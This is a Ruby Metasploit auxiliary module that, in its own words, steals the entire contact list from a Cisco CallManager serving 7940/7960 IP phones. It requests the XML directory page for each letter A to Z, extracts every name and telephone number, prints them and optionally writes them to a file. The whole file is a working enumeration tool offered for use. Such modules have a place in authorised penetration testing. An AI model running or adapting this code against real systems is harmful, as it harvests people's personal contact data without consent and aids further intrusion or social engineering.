require 'msf/core'
require 'rex'
require 'rexml/document'


class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'Cisco IP Phone Directory List Enumerator',
			'Description' => %q{
								This module attempts to query the CallManager for a Cisco IP Phone 7940 or 7960
								 to steal its entire contact list.
				},
			'Author' => ['Matt "hostess" Andreko <mandreko[at]accuvant.com>'],
			'References'     =>
				[
					[ 'URL', 'http://www.cisco.com/en/US/prod/collateral/voicesw/ps6788/phones/ps379/product_data_sheet09186a00800925a8.html' ],
				]
		))

		register_options(
				[
						OptString.new('TARGETURI', [true, 'The URI path to the Cisco CallManager API', '/ccmcip/xmldirectorylist.jsp']),
						Opt::RPORT(8080),
						OptString.new('OUTFILE', [false, "A filename to store the generated directory contact list"]),
				], self.class)
	end

	def parse_users(body)
		xml= REXML::Document.new(body).root
		xml.elements.to_a("//DirectoryEntry").each do |node|
			name = node.elements['Name'].text
			telephone = node.elements['Telephone'].text
			@users[name] = telephone
		end
	end

	def write_output(data)
		print_status("Writing directory contact list to #{datastore['OUTFILE']}...")
		::File.open(datastore['OUTFILE'], "ab") do |fd|
			fd.write("Name\tTelephone\n")
			fd.write(data)
		end
	end

	def run
		@users = Hash.new
		("A".."Z").each do |current_letter|
			r = send_request_cgi({
				'uri' => "#{target_uri.to_s}?l=#{current_letter}",
				'method' => 'GET',
			})

			parse_users(r.body)
		end

		print_status("Located #{@users.length} directory contacts.")
		@users.each do |k, v|
			print_status("Name: #{k}\tTelephone: #{v}")
		end

		write_output(@users.map { |k, v| "#{k}\t#{v}" }.join("\n")) if datastore['OUTFILE']
	end
end
